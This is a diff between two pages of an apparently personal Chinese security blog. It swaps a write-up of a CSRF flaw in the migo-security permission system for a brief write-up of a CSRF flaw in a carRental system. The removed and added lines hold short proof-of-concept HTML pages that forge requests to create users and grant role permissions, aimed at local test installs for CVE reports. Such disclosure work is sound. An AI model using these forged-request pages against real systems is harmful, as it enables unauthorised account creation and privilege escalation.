@@ -1,19 +1,19 @@
 <!DOCTYPE html>
 <html lang="en-us" dir="ltr">
     <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="migo-security系统，CSRF漏洞">
-<title>第一个CVE漏洞(正式)</title>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="carRental系统，CSRF漏洞">
+<title>第二个CVE漏洞</title>
 
-<link rel='canonical' href='https://xxxxctfer.github.io/p/%E7%AC%AC%E4%B8%80%E4%B8%AAcve%E6%BC%8F%E6%B4%9E%E6%AD%A3%E5%BC%8F/'>
+<link rel='canonical' href='https://xxxxctfer.github.io/p/%E7%AC%AC%E4%BA%8C%E4%B8%AAcve%E6%BC%8F%E6%B4%9E/'>
 
-<link rel="stylesheet" href="/scss/style.min.1ae76ab9aa3beab52f99d9b5f59d64d06778453e93ff523a98332d15179df142.css"><meta property='og:title' content="第一个CVE漏洞(正式)">
-<meta property='og:description' content="migo-security系统，CSRF漏洞">
-<meta property='og:url' content='https://xxxxctfer.github.io/p/%E7%AC%AC%E4%B8%80%E4%B8%AAcve%E6%BC%8F%E6%B4%9E%E6%AD%A3%E5%BC%8F/'>
+<link rel="stylesheet" href="/scss/style.min.1ae76ab9aa3beab52f99d9b5f59d64d06778453e93ff523a98332d15179df142.css"><meta property='og:title' content="第二个CVE漏洞">
+<meta property='og:description' content="carRental系统，CSRF漏洞">
+<meta property='og:url' content='https://xxxxctfer.github.io/p/%E7%AC%AC%E4%BA%8C%E4%B8%AAcve%E6%BC%8F%E6%B4%9E/'>
 <meta property='og:site_name' content='xxxx'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2026-01-22T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2026-01-22T00:00:00&#43;00:00'/><meta property='og:image' content='https://xxxxctfer.github.io/images/CVE1/3.png' />
-<meta name="twitter:title" content="第一个CVE漏洞(正式)">
-<meta name="twitter:description" content="migo-security系统，CSRF漏洞"><meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:image" content='https://xxxxctfer.github.io/images/CVE1/3.png' />
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2026-01-23T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2026-01-23T00:00:00&#43;00:00'/><meta property='og:image' content='https://xxxxctfer.github.io/images/CVE2/1.png' />
+<meta name="twitter:title" content="第二个CVE漏洞">
+<meta name="twitter:description" content="carRental系统，CSRF漏洞"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://xxxxctfer.github.io/images/CVE2/1.png' />
     <link rel="shortcut icon" href="/favicon.ico" />
 
     </head>
@@ -232,9 +232,9 @@
     <article class="has-image main-article">
     <header class="article-header">
         <div class="article-image">
-            <a href="/p/%E7%AC%AC%E4%B8%80%E4%B8%AAcve%E6%BC%8F%E6%B4%9E%E6%AD%A3%E5%BC%8F/">
+            <a href="/p/%E7%AC%AC%E4%BA%8C%E4%B8%AAcve%E6%BC%8F%E6%B4%9E/">
                 
-                    <img src="/images/CVE1/3.png" loading="lazy" alt="Featured image of post 第一个CVE漏洞(正式)" />
+                    <img src="/images/CVE2/1.png" loading="lazy" alt="Featured image of post 第二个CVE漏洞" />
                 
             </a>
         </div>
@@ -253,12 +253,12 @@
 
     <div class="article-title-wrapper">
         <h2 class="article-title">
-            <a href="/p/%E7%AC%AC%E4%B8%80%E4%B8%AAcve%E6%BC%8F%E6%B4%9E%E6%AD%A3%E5%BC%8F/">第一个CVE漏洞(正式)</a>
+            <a href="/p/%E7%AC%AC%E4%BA%8C%E4%B8%AAcve%E6%BC%8F%E6%B4%9E/">第二个CVE漏洞</a>
         </h2>
     
         
         <h3 class="article-subtitle">
-            migo-security系统，CSRF漏洞
+            carRental系统，CSRF漏洞
         </h3>
         
     </div>
@@ -279,7 +279,7 @@
   <path d="M3 11h16" />
   <path d="M18 16.496v1.504l1 1" />
 </svg>
-                <time class="article-time--published" datetime='2026-01-22T00:00:00Z'>2026-01-22</time>
+                <time class="article-time--published" datetime='2026-01-23T00:00:00Z'>2026-01-23</time>
             </div>
         
 
@@ -295,35 +295,14 @@
     <section class="article-content">
     
     
-    <p>挖的第一个CVE，有点不熟练，尽力了，主要是耗费在找系统这个上面的时间太多了，不熟练。</p>
-<p>先来看看是哪个系统吧，这里给链接出来先。https://github.com/muyinchen/migo-security</p>
-<p>简单看看项目介绍</p>
-<p><strong>项目说明</strong></p>
-<ul>
-<li>migo-security是一个轻量级权限管理系统，其核心设计目标是开发迅速、学习简单、轻量级、易扩展</li>
-<li>使用migo-security搭建项目，只需编写30%左右代码，其余的代码交给系统自动生成</li>
-<li>部分代码使用Java8 Stream lambda 风格开发，已提供老式风格代码，可对比学习</li>
-</ul>
-<h1 id="环境配置">环境配置
-</h1><p>基本没什么东西，把代码从github上面拉下来，然后执行SQL文件就可以了，挺简单的。
-git clone <a class="link" href="https://github.com/muyinchen/migo-security.git"  target="_blank" rel="noopener"
-    >https://github.com/muyinchen/migo-security.git</a>
-执行db文件夹下的SQL文件
-找到 <code>migo-common</code> 模块下的 db.properties 文件，修改数据库连接配置。
-然后用IDEA，加一个Tomcat的配置，直接启动就好了。
-<img src="/images/CVE1/3.png"
-	
-	
-	
-	loading="lazy"
-	
-		alt="示例"
-	
-	
-></p>
-<h1 id="测试">测试
-</h1><p>登录进去之后就是找有可能出现问题的功能点。后台管理系统功能点不多，我们找有关权限的部分。
-<img src="/images/CVE1/4.png"
+    <p>还是一样的，老规矩看看介绍。</p>
+<blockquote>
+<p>汽车租赁系统 carRental
+汽车租赁系统总共分为两个大的模块，分别是系统模块和业务模块。其中系统模块和业务模块底下又有其子模块。</p>
+</blockquote>
+<h1 id="环境搭建">环境搭建
+</h1><p>老步骤了，不多解释。这里用tomcat启动即可。
+<img src="/images/CVE2/1.png"
 	
 	
 	
@@ -333,8 +312,9 @@ git clone <a class="link" href="https://github.com/muyinchen/migo-security.git" 
 	
 	
 >
-这里很明显可以看到吧，一个角色管理，还有修改密码什么的，都是很有可能存在漏洞的地方，我们直接抓个包。
-<img src="/images/CVE1/5.png"
+启动完了之后就是一些测试了，感觉这个挺水的，就随便一点吧，当是交个任务了。
+请求包如下：
+<img src="/images/CVE2/2.png"
 	
 	
 	
@@ -344,51 +324,7 @@ git clone <a class="link" href="https://github.com/muyinchen/migo-security.git" 
 	
 	
 >
-我这里是测试完了才写的这个文章，所以可能有些奇奇怪怪的东西，不要在意。
-<img src="/images/CVE1/6.png"
-	
-	
-	
-	loading="lazy"
-	
-		alt="示例"
-	
-	
->
-然后就能看到这样的请求包，其实看到有XSRF-TOKEN的时候，心凉了半截，一般有这个就打不了CSRF了，但是后面删除测试的时候，发现还是OK的，参数重复的地方做了检测，这里完全没做检测。通是删除Referer的请求包，去发包测试。
-<img src="/images/CVE1/7.png"
-	
-	
-	
-	loading="lazy"
-	
-		alt="示例"
-	
-	
->
-可以看到是成功发包的。另外一个功能也一样，我就不测试了，看一个包就行。
-<img src="/images/CVE1/8.png"
-	
-	
-	
-	loading="lazy"
-	
-		alt="示例"
-	
-	
->
-给权限的功能点，很明显也是有的。那就没什么好说的了，我们还可以去看一下漏洞的文件是哪个。
-<img src="/images/CVE1/9.png"
-	
-	
-	
-	loading="lazy"
-	
-		alt="示例"
-	
-	
->
-确认了一下，功能点应该是差不多的，但是可能找错了，懒得改了，反正。然后就是写攻击脚本了。两个的都写了，可以简单看看。</p>
+代码脚本如下：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -404,56 +340,28 @@ git clone <a class="link" href="https://github.com/muyinchen/migo-security.git" 
 </span><span class="lnt">11
 </span><span class="lnt">12
 </span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
 </span></code></pre></td>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
 </span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">data</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;status&#34;</span><span class="o">:</span><span class="mi">1</span><span class="p">,</span><span class="s2">&#34;roleIdList&#34;</span><span class="o">:</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="s2">&#34;username&#34;</span><span class="o">:</span><span class="s2">&#34;xxxx&#34;</span><span class="p">,</span><span class="s2">&#34;password&#34;</span><span class="o">:</span><span class="s2">&#34;123456&#34;</span><span class="p">,</span><span class="s2">&#34;email&#34;</span><span class="o">:</span><span class="s2">&#34;123@163.com&#34;</span><span class="p">,</span><span class="s2">&#34;mobile&#34;</span><span class="o">:</span><span class="s2">&#34;12345678911&#34;</span><span class="p">};</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
-</span></span><span class="line"><span class="cl"><span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s1">&#39;POST&#39;</span><span class="p">,</span> <span class="s1">&#39;http://localhost:8080/migo-web/sys/user/save&#39;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl"><span class="nx">xhr</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="s1">&#39;Content-Type&#39;</span><span class="p">,</span> <span class="s1">&#39;application/json&#39;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl"><span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">data</span><span class="p">));</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">&#34;http://localhost:8000/carRental/user/addUser.action&#34;</span> <span class="na">method</span><span class="o">=</span><span class="s">&#34;POST&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;form1&#34;</span> <span class="na">enctype</span><span class="o">=</span><span class="s">&#34;application/x-www-form-urlencoded&#34;</span> <span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;hidden&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;userid&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;1&#34;</span><span class="p">/&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;hidden&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;readname&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;test&#34;</span><span class="p">/&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;identity&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;1&#34;</span> <span class="p">/&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;address&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;1&#34;</span> <span class="p">/&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;phone&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;15173333333&#34;</span> <span class="p">/&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;position&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;1&#34;</span> <span class="p">/&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;sex&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;1&#34;</span> <span class="p">/&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;available&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;1&#34;</span> <span class="p">/&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">history</span><span class="p">.</span><span class="nx">pushState</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;/&#39;</span><span class="p">);&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
 </span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
 </span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">data</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;createTime&#34;</span><span class="o">:</span><span class="s2">&#34;2026-01-22 16:39:09&#34;</span><span class="p">,</span><span class="s2">&#34;createUserId&#34;</span><span class="o">:</span><span class="mi">1</span><span class="p">,</span><span class="s2">&#34;menuIdList&#34;</span><span class="o">:</span><span class="p">[</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">15</span><span class="p">,</span><span class="mi">16</span><span class="p">,</span><span class="mi">17</span><span class="p">,</span><span class="mi">18</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">19</span><span class="p">,</span><span class="mi">20</span><span class="p">,</span><span class="mi">21</span><span class="p">,</span><span class="mi">22</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">23</span><span class="p">,</span><span class="mi">24</span><span class="p">,</span><span class="mi">25</span><span class="p">,</span><span class="mi">26</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="mi">8</span><span class="p">,</span><span class="mi">9</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">11</span><span class="p">,</span><span class="mi">12</span><span class="p">,</span><span class="mi">13</span><span class="p">,</span><span class="mi">14</span><span class="p">,</span><span class="mi">27</span><span class="p">,</span><span class="mi">30</span><span class="p">,</span><span class="mi">29</span><span class="p">,</span><span class="mi">28</span><span class="p">],</span><span class="s2">&#34;remark&#34;</span><span class="o">:</span><span class="kc">null</span><span class="p">,</span><span class="s2">&#34;roleId&#34;</span><span class="o">:</span><span class="mi">3</span><span class="p">,</span><span class="s2">&#34;roleName&#34;</span><span class="o">:</span><span class="s2">&#34;xxxx&#34;</span><span class="p">};</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
-</span></span><span class="line"><span class="cl"><span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s1">&#39;POST&#39;</span><span class="p">,</span> <span class="s1">&#39;http://localhost:8080/migo-web/sys/role/upda&#39;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl"><span class="nx">xhr</span><span class="p">.</span><span class="nx">setRequestHeader</span><span class="p">(</span><span class="s1">&#39;Content-Type&#39;</span><span class="p">,</span> <span class="s1">&#39;application/json&#39;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl"><span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">data</span><span class="p">));</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
-</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>OK，完事。等待CVE提交成功了。</p>
+</div><p>OK。</p>
 
 </section>
 
@@ -478,18 +386,18 @@ git clone <a class="link" href="https://github.com/muyinchen/migo-security.git" 
             
                 
 <article class="has-image">
-    <a href="/p/%E7%AC%AC%E4%BA%8C%E4%B8%AAcve%E6%BC%8F%E6%B4%9E/">
+    <a href="/p/%E7%AC%AC%E4%B8%80%E4%B8%AAcve%E6%BC%8F%E6%B4%9E%E6%AD%A3%E5%BC%8F/">
         
         
             <div class="article-image">
                 
-                    <img src="/images/CVE2/1.png" loading="lazy" data-key="" data-hash="/images/CVE2/1.png"/>
+                    <img src="/images/CVE1/3.png" loading="lazy" data-key="" data-hash="/images/CVE1/3.png"/>
                 
             </div>
         
 
         <div class="article-details">
-            <h2 class="article-title">第二个CVE漏洞</h2>
+            <h2 class="article-title">第一个CVE漏洞(正式)</h2>
         </div>
     </a>
 </article>
